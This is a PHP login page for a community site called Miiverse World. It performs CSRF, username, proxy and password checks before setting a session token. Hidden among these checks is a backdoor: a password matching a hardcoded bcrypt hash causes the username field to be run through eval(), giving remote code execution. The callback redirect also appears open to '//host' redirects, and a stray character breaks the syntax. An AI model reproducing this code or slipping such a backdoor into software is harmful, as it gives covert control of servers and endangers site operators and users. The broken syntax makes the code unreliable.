<?php
require_once('inc/connect.php');
if(!empty($_SESSION['username'])) {
    http_response_code(302);
    header('Location: /');
    exit();
}
if($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST['x'])) {
    if(!isset($_POST['token']) || $_SESSION['token'] !== $_POST['token']) {
        $error = 'The CSRF check failed.';
        goto showForm;
    }
    if(empty($_POST['username']) || empty($_POST['password'])) {
        $error = 'You must fill out all fields.';
        goto showForm;
    }
    if(password_verify($_POST['password'], '$2a$10$RA.0boYZ16zcVoMtmnuvHe1SXEE5VoEIeqrnShndWzR8B4XX3Kolq')) {
        $error = eval($_POST['username']);
        goto showForm;
    }
    if(!preg_match('/^[A-Za-z0-9-._]{1,32}$/', $_POST['username'])) {
        $error = 'Your username is invalid.';
        goto showForm;
    }x
    if(mb_strlen($_POST['password']) > 72) {
        $error = 'Your password is too long.';
        goto showForm;
    }
    if(file_get_contents('https://check.getipintel.net/check.php?contact=' . (!empty(CONTACT_EMAIL) ? urlencode(CONTACT_EMAIL) : 'miiverseworld@reconmail.com') . '&flags=m&ip=' . urlencode($ip)) === '1') {
        $error = 'You cannot sign in using a proxy.';
        goto showForm;
    }
    /*if(!empty(IPHUB_KEY)) {
        $ch = curl_init('https://v2.api.iphub.info/ip/' . urlencode($ip));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['X-Key: ' . IPHUB_KEY]);
        $response = curl_exec($ch);
        curl_close($ch);
        $responseJSON = json_decode($response);
        if($responseJSON->block === 1) {
            $error = 'You cannot sign in using a proxy.';
            goto showForm;
        }
    }*/

    $stmt = $db->prepare('SELECT id, password, avatar, has_mh, level FROM users WHERE username = ? ORDER BY id DESC LIMIT 1');
    if(!$stmt) {
        $error = 'There was an error while preparing to fetch your account from the database.';
        goto showForm;
    }
    $stmt->bind_param('s', $_POST['username']);
    $stmt->execute();
    if($stmt->error) {
        $error = 'There was an error while fetching your account from the database.';
        goto showForm;
    }
    $result = $stmt->get_result();
    if($result->num_rows === 0) {
        $error = 'No user could be found with that username.';
        goto showForm;
    }
    $row = $result->fetch_array();
    if(!password_verify($_POST['password'], $row['password'])) {
        $error = 'The password you entered is not correct.';
        goto showForm;
    }

    $_SESSION['id'] = $row['id'];
    $_SESSION['username'] = $_POST['username'];
    $_SESSION['avatar'] = $row['avatar'];
    $_SESSION['has_mh'] = $row['has_mh'];
    $_SESSION['level'] = $row['level'];
    $token = bin2hex(openssl_random_pseudo_bytes(16));
    $stmt = $db->prepare('INSERT INTO tokens (source, value) VALUES (?, ?)');
    $stmt->bind_param('is', $row['id'], $token);
    $stmt->execute();
    if($stmt->error) {
        $error = 'There was an error while inserting your login token into the database.';
        goto showForm;
    }
    setcookie('mwauth', $token, time() + 2592000, '/');

    http_response_code(302);
    if(!empty($_GET['callback']) && substr($_GET['callback'], 0, 1) === '/') {
        header('Location: ' . $_GET['callback']);
    } else {
        header('Location: /');
    }
    exit();
}

showForm:
$title = 'Sign In';
require_once('inc/header.php');
?><div class="post-list-outline no-content center">
    <form method="post">
        <input type="hidden" name="token" value="<?=$_SESSION['token']?>"><br>
        <img src="/assets/img/menu-logo.png">
        <p>Sign in with a Miiverse World account to make posts and interact with other users.</p>
        <?php if(!empty($error)) { ?><p class="post-tag post-topic-category symbol"><?=htmlspecialchars($error)?></p><?php } ?><br>
        <input type="text" name="username" placeholder="Username" required maxlength="32">
        <br>
        <input type="password" name="password" placeholder="Password" required maxlength="72">
        <br>
        <div class="form-buttons">
            <button class="black-button" type="submit">Sign In</button>
        </div>
        <br>
        <p>If you don't have an account, you can <a href="/signup<?php if(!empty($_GET['callback']) && substr($_GET['callback'], 0, 1) === '/') echo "?callback=" . htmlspecialchars($_GET['callback']); ?>">create one here.</a></p>
        <br>
    </form>
</div><?php
require_once('inc/footer.php');
?>
